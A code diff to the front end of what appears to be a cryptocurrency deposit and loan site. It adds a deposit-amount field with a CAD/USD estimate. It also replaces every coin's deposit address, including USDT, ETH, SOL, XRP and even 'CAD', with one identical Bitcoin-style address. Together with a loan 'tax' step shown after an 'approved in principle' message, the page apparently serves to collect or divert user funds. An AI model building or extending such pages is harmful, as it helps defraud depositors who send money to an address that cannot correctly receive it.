@@ -609,6 +609,13 @@
                     <span class="pill pending">Pending</span> → confirmations complete → <span class="pill confirmed">Confirmed</span>
                   </div>
                 </div>
+                <label class="field-lbl" style="margin-top:14px;">Amount to Deposit</label>
+                <div style="position:relative;">
+                  <input class="inp" id="dep-amount" type="number" min="0" step="any" placeholder="0.00" oninput="onDepAmountChange()" style="padding-right:70px;" />
+                  <span id="dep-amount-coin" style="position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:.8rem;font-weight:700;color:var(--accent);pointer-events:none;">BTC</span>
+                </div>
+                <div id="dep-amount-equiv" style="font-size:.75rem;color:var(--muted);margin-top:6px;min-height:16px;"></div>
+
                 <div class="ack-row">
                   <input type="checkbox" id="dep-ack" onchange="onDepAckChange()" />
                   <div>
@@ -836,7 +843,7 @@
     <div class="lm-step-section" id="lm-step-tax">
       <div class="lm-success">
         <div class="lm-success-icon" style="background:rgba(247,166,0,.12);border-color:rgba(247,166,0,.4);">
-          <svg width="26" height="26" fill="none" stroke="#F7A600" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4m0 4h.01"/></svg>
+          <svg width="28" height="26" fill="none" stroke="#F7A600" stroke-width="2" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
         </div>
         <h3>Action Required</h3>
         <p>Your loan application has been received and approved in principle.</p>
@@ -1263,6 +1270,7 @@
 
   /* ═══ Assets tab ═══ */
   window.__assetBalances = {};
+  window.__lastPrices    = {};
   function loadAssets() {
     fetch('/api/assets')
       .then(r => r.json())
@@ -1270,6 +1278,7 @@
         document.getElementById('total-assets').textContent  = 'CA$' + Number(d.total_cad   || 0).toLocaleString('en-CA', { maximumFractionDigits: 2 });
         document.getElementById('avail-balance').textContent = 'CA$' + Number(d.available_cad || 0).toLocaleString('en-CA', { maximumFractionDigits: 2 });
         window.__assetBalances = {};
+        window.__lastPrices    = {};
         const rows = (d.assets || []).filter(a => a.amount > 0);
         if (!rows.length) {
           document.getElementById('asset-body').innerHTML = '<tr><td colspan="5" class="empty-state">No balances yet.</td></tr>';
@@ -1277,6 +1286,7 @@
         }
         document.getElementById('asset-body').innerHTML = rows.map(a => {
           window.__assetBalances[a.coin] = a.amount;
+          window.__lastPrices[a.coin]    = a.price_usd || 0;
           const bal = a.amount < 1 ? a.amount.toFixed(6) : Number(a.amount).toLocaleString('en-US', { maximumFractionDigits: 4 });
           return `<tr>
             <td style="font-weight:700;color:var(--accent);">${a.coin}</td>
@@ -1319,17 +1329,17 @@
     Dogecoin:    { min:'100 DOGE',   conf:'6',  fee:'1 DOGE',        time:'~5 min' },
   };
   const DEP_ADDRESSES = {
-    USDT:'TN3W4H6rK2ce4vX9YnFQHwKx6X8eVFkKb7',
-    USDC:'0x742d35Cc6634C0532925a3b8D4C9Ec7Cb4b4c2E',
-    BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf7',
-    ETH: '0x742d35Cc6634C0532925a3b8D4C9Ec7Cb4b4c2E',
-    BNB: 'bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2',
-    SOL: '9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM',
-    XRP: 'rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh',
-    TRX: 'TN3W4H6rK2ce4vX9YnFQHwKx6X8eVFkKb7',
-    LTC: 'LgZcpEMoFDRdHjHjQQC5tGGrB4KJRP7oVG',
-    DOGE:'DGXxxXXxXxXxxXXxXXxXXxXXxXXxXXxXXxXX',
-    CAD: '0x742d35Cc6634C0532925a3b8D4C9Ec7Cb4b4c2E',
+    USDT:'36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    USDC:'36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    BTC: '36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    ETH: '36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    BNB: '36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    SOL: '36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    XRP: '36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    TRX: '36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    LTC: '36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    DOGE:'36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
+    CAD: '36KjWjcitLJPesBYsJMewpxFzqAbe64zwu',
   };
 
   window.buildNetworkOptions = function(coinSelId, netSelId) {
@@ -1342,6 +1352,24 @@
   window.onDepCoinChange = function() {
     buildNetworkOptions('dep-coin','dep-network');
     onDepNetworkChange();
+    const coin = document.getElementById('dep-coin').value;
+    document.getElementById('dep-amount-coin').textContent = coin;
+    onDepAmountChange();
+  };
+
+  window.onDepAmountChange = function() {
+    const coin   = document.getElementById('dep-coin').value;
+    const amount = parseFloat(document.getElementById('dep-amount').value) || 0;
+    const equiv  = document.getElementById('dep-amount-equiv');
+    const by_sym = window.__lastPrices || {};
+    const price  = by_sym[coin] || 0;
+    if (amount > 0 && price > 0) {
+      const usd = amount * price;
+      const cad = usd * 1.36;
+      equiv.textContent = `≈ CA$${cad.toLocaleString('en-CA',{minimumFractionDigits:2,maximumFractionDigits:2})} (US$${usd.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})})`;
+    } else {
+      equiv.textContent = '';
+    }
   };
   window.onDepNetworkChange = function() {
     const net = document.getElementById('dep-network').value;
